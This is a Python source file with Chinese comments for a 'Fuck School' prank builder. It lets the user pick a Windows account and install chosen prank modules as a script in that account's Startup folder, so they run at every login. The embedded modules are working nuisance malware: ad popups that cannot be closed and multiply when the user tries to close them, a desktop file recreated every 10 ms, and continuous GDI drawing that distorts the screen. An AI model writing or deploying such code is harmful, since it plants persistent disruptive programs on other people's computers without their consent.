# *-* encoding: utf-8 *-*

# 请使用该main.py文件！它整合了所有功能，可以更方便的“Fuck School”
# model.py是main.py的模板，但缺失了很多重要信息，和main.py有本质的区别
# 若想通过model.py生成main.py，请使用update.py

import tkinter as tk
from tkinter import font, messagebox
import os

fucks = ["import tkinter as tk\nfrom tkinter import messagebox, font\nimport threading\nimport time\nimport webbrowser\nimport random\n\ndef ad_thread():\n    class MainWindow(tk.Tk):\n        def __init__(self):\n            super().__init__()\n            self.overrideredirect(True)\n            self.geometry('480x360+{x}+{y}'.format(x=random.randint(0, self.winfo_screenwidth() - 480),\n                                                   y=random.randint(0, self.winfo_screenheight() - 360)))\n            self.attributes('-topmost', True)\n            self.resizable(False, False)\n            self.protocol('WM_DELETE_WINDOW', self.close)\n\n            bg = tk.Frame(self, bg='#333333')\n            bg.pack(fill=tk.BOTH, expand=True)\n\n            title = tk.Label(bg, text='提示：', font=font.Font(size=36, weight='bold'), fg='white', bg='#333333')\n            title.pack(padx=10, pady=10, fill=tk.X)\n            title = tk.Label(bg, text='不要298，不要198，不要98！', font=font.Font(size=24, weight='bold'), fg='#919810', bg='#114514')\n            title.pack(padx=10, pady=10, fill=tk.X)\n            title = tk.Label(bg, text='您已获得一张免费的广告，广告窗口无法关闭。', font=font.Font(size=16, weight='bold'), fg='#919810', bg='#114514')\n            title.pack(padx=10, pady=10, fill=tk.X)\n            button = tk.Button(bg, text='点击查看广告', font=font.Font(size=32, weight='bold'), fg='white', bg='#222222', command=self.open_ad)\n            button.pack(padx=10, pady=10, fill=tk.X)\n\n        def close(self):\n            messagebox.showwarning('警告', '广告窗口无法关闭！接受惩罚：出现5个新广告窗口。')\n            for _ in range(5):\n                threading.Thread(target=lambda: MainWindow().mainloop()).start()\n\n        def open_ad(self):\n            webbrowser.open('https://www.bilibili.com/video/BV1GJ411x7h7/')\n            messagebox.showinfo('提示', '广告内容已打开，请注意观看！')\n            self.destroy()\n\n    while True:\n        start = time.time()\n        MainWindow().mainloop()\n        dis = time.time() - start\n        time.sleep(min(dis * 2, 90))\n\nthreading.Thread(target=ad_thread).start()\n", 'import os\nimport threading\nimport time\n\ndef cake_thread():\n    filename = \'C:\\\\Users\\\\{username}\\\\Desktop\\\\cake.txt\'\n    contents = """一个大蛋糕：\n\n                    0   0\n                    |   |\n                ____|___|____\n            0  |~ ~ ~ ~ ~ ~|   0\n            |  |           |   |\n        ___|__|___________|___|__\n        |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/|\n    0   |       H a p p y       |   0\n    |   |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/|   |\n    _|___|_______________________|___|__\n    |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/|\n    |                                   |\n    |         B i r t h d a y! ! !      |\n    | ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |\n    |___________________________________|\n\n    生日快乐！你删不掉他的快乐！\n\n    哈哈哈，永远别想删掉他，删掉就自动重新创建！！！\n    """\n\n    def check_file():\n        if not os.path.exists(filename):\n            return False\n        try:\n            with open(filename, \'r\', encoding=\'utf-8\') as f:\n                if f.read() == contents:\n                    return True\n            return False\n        except Exception as e:\n            print(\'检查错误：\', e)\n            return False\n\n    while True:\n        if not check_file():\n            print(\'Cake 已丢失，准备重新创建。\')\n            try:\n                with open(filename, \'w\', encoding=\'utf-8\') as f:\n                    f.write(contents)\n                print(\'成功创建 Cake。\')\n            except Exception as e:\n                print(\'创建文件错误：\', e)\n        time.sleep(0.01)\n\nthreading.Thread(target=cake_thread).start()\n', '# Convert from C++\n\nfrom random import randint, randrange, choice\nimport ctypes\nfrom ctypes import windll, wintypes\nimport time\nimport threading\n\ngdi = windll.gdi32\nuser = windll.user32\n\ndef screendraw_thread():\n    def drawLine(hdc):\n        rgb = randint(0, 0xffffff)\n        x1 = randrange(0, width)\n        x2 = randrange(0, width)\n        y1 = randrange(0, height)\n        y2 = randrange(0, height)\n        w = randint(3, 10)\n        hpen = gdi.CreatePen(0, w, rgb)\n        gdi.SelectObject(hdc, hpen)\n        gdi.MoveToEx(hdc, x1, y1, 0)\n        gdi.LineTo(hdc, x2, y2)\n\n    class POINT(ctypes.Structure):\n        _fields_ = [("x", wintypes.LONG), \n                    ("y", wintypes.LONG)]\n\n    def drawCursorCircle(hdc):\n        mouse = POINT()\n        user.GetCursorPos(ctypes.byref(mouse))\n        x, y = mouse.x, mouse.y\n\n        rgb = randint(0, 0xffffff)\n        w = randint(3, 10)\n\n        hpen = gdi.CreatePen(0, 1, rgb)\n        gdi.SelectObject(hdc, hpen)\n        gdi.Ellipse(hdc, x - w, y - w, x + w, y + w)\n        gdi.DeleteObject(hpen)\n\n    def drawIcon(hdc):\n        x = randrange(0, width)\n        y = randrange(0, height)\n        id = randint(32512, 32516)\n        hIcon = user.LoadIconW(0, id)\n        user.DrawIcon(hdc, x, y, hIcon)\n        user.DestroyIcon(hIcon)\n\n    def drawDissolution(hdc):\n        w = randint(10, 30)\n        x = randint(0, width - w)\n        s = randint(10, 30)\n        gdi.BitBlt(hdc, x, s, w, height, hdc, x, 0, 13369376)\n\n    def drawMovescreen(hdc):\n        mul = [[-1, 0], [1, 0], [0, 1], [0, -1]]\n        dir = choice(mul)\n        s = randint(3, 10)\n        gdi.BitBlt(hdc, dir[0] * s, dir[1] * s, width, height, hdc, 0, 0, 13369376)\n\n    hWnd = user.GetDesktopWindow()\n    fns = [drawLine, drawCursorCircle, drawIcon, drawDissolution, drawMovescreen]\n    while True:\n        hdc = user.GetDC(hWnd)\n        width = gdi.GetDeviceCaps(hdc, 118)\n        height = gdi.GetDeviceCaps(hdc, 117)\n\n        choice(fns)(hdc)\n\n        user.ReleaseDC(hWnd, hdc)\n        time.sleep(0.1)\n\nthreading.Thread(target=screendraw_thread).start()\n']
descriptions = ['【广告功能 - {filename}.py】\n\n随机时间，随机位置弹出广告窗口。\n\n点击广告按钮，将显示“Never Gonna Give You Up”视频（https://www.bilibili.com/video/BV1GJ411x7h7/）。\n\n已隐藏关闭按钮，广告需要使用任务管理器关闭。\n', '【蛋糕功能 - {filename}.py】\n\n在桌面上重复生成“cake.txt”。\n\n内容如下：\n\n                 0   0\n                 |   |\n             ____|___|____\n          0  |~ ~ ~ ~ ~ ~|   0\n          |  |           |   |\n       ___|__|___________|___|__\n       |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/|\n   0   |       H a p p y       |   0\n   |   |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/|   |\n  _|___|_______________________|___|__\n |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/|\n |                                   |\n |         B i r t h d a y! ! !      |\n | ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |\n |___________________________________|\n', '【屏幕绘制功能 - {filename}.py】\n\n重复地绘制屏幕！\n\n* “drawIcon”：绘制随机的图标。\n* “drawCursorCircle”：在鼠标旁边绘制圆圈。\n* “drawLine”：绘制随机线条。\n* “drawDissolution”：让屏幕的一列向下溶解。\n* “drawMovescreen”：让整个屏幕上下左右移动。\n']
filenames = ['fucks\\ad', 'fucks\\cake', 'fucks\\screendraw']

class SelectPage(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)

        self.create_widgets()

    def create_widgets(self):
        self.list = tk.Listbox(self, selectmode=tk.SINGLE)
        self.list.pack(fill=tk.BOTH, expand=True)

        special_folder = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public']
        for user in os.listdir('C:\\Users\\'):
            if user in special_folder:
                continue
            self.list.insert(tk.END, user)

class FuckPage(tk.Frame):
    def __init__(self, master=None, index=0):
        super().__init__(master)

        self.index = index
        self.create_widgets()

    def create_widgets(self):
        self.text = tk.Text(self, font=font.Font(family='新宋体'))
        self.text.pack(fill=tk.BOTH, expand=True)

        self.text.tag_config('name', font=font.Font(family='新宋体', slant='italic'))
        self.text.tag_config('title', font=font.Font(family='新宋体', weight='bold'))

        for line in descriptions[self.index] \
                        .replace('{filename}', filenames[self.index]) \
                        .split('\n'):
            style = []

            for char in line:
                if char == '“':
                    style.append('name')
                elif char == '【':
                    style.append('title')

                self.text.insert(tk.END, char.replace('*', '※'), *style)

                if char == '”':
                    style.remove('name')
                elif char == '】':
                    style.remove('title')
            self.text.insert(tk.END, '\n')

class GoodbyePage(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)

        self.create_widgets()

    def create_widgets(self):
        self.label = tk.Message(self, text='恭喜你，你已经成功完成了设置向导！\n\n确定要应用你的设置吗，请慎重决定！', width=400, font=font.Font(size=16))
        self.label.pack(fill=tk.BOTH, expand=True)

class MainWindow(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Fuck School")
        self.geometry('480x360')

        self.index = 0
        self.last_page = None
        self.create_widgets()
        self.create_widgets()
        self.selected = []

    def select(self, value):
        print('用户选择', value)
        self.selected.append(value)
        self.create_widgets()

    def create_widgets(self):
        if self.last_page:
            self.last_page.destroy()

        if self.index == 0:
            self.top_frame = tk.Frame(self)
            self.top_frame.pack(side=tk.TOP, fill=tk.X)

            self.left_button = tk.Button(self.top_frame, text='...')
            self.left_button.pack(side=tk.LEFT)

            self.right_button = tk.Button(self.top_frame, text='...')
            self.right_button.pack(side=tk.RIGHT)

            self.title_label = tk.Label(self.top_frame, text='...')
            self.title_label.pack(side=tk.TOP, fill=tk.X)

        if self.index == 1:
            self.left_button.config(state=tk.DISABLED, text='【禁用】', command=lambda: None)
            command = lambda: self.select(l.get(l.curselection()[0])) \
                          if l.curselection() \
                          else messagebox.showwarning('警告', '请先选择用户！')
            self.right_button.config(state=tk.NORMAL, text='确定', command=command)
            self.title_label.config(text='选择用户')

            self.last_page = SelectPage(self)
            l = self.last_page.list
            self.last_page.pack(fill=tk.BOTH, expand=True)
        
        if 2 <= self.index <= 1 + len(fucks):
            self.left_button.config(state=tk.NORMAL, text='启用', command=lambda: self.select('enable'))
            self.right_button.config(state=tk.NORMAL, text='禁用', command=lambda: self.select('disable'))
            self.title_label.config(text='恶搞模块')

            self.last_page = FuckPage(self, index=self.index - 2)
            self.last_page.pack(fill=tk.BOTH, expand=True)
        
        if self.index > 1 + len(fucks):
            self.left_button.config(state=tk.NORMAL, text='应用（慎重）', command=lambda: self.last_step())
            self.right_button.config(state=tk.NORMAL, text='退出', command=lambda: self.destroy())
            self.title_label.config(text='再见！')

            self.last_page = GoodbyePage(self)
            self.last_page.pack(fill=tk.BOTH, expand=True)
        
        self.index += 1
    
    def last_step(self):
        result = ['# *-* encoding: utf-8 *-*\n\n' \
                  '# This file is generated by Fuck School. Please do not modify it.\n' \
                  '# 这个文件是由 Fuck School 自动生成的。请不要修改它。\n']
        username = self.selected.pop(0)
        for i, item in enumerate(zip(fucks, self.selected)):
            code, state = item
            if state == 'enable':
                result.append(code.replace('{username}', username)
                                  .replace('{filename}', filenames[i]))
        codes = '\n'.join(result)
        fuck_file = f'C:\\Users\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fuck_school.pyw'
        with open(fuck_file, 'w', encoding='utf-8') as f:
            f.write(codes + '\n')
        fast_start = messagebox.askyesno('恭喜！', '恶搞设置已应用，并添加到计算机自动启动文件夹。\n\n点击确定立即启用恶搞设置。')
        self.destroy()
        if fast_start:
            os.startfile(fuck_file)
        
MainWindow().mainloop()
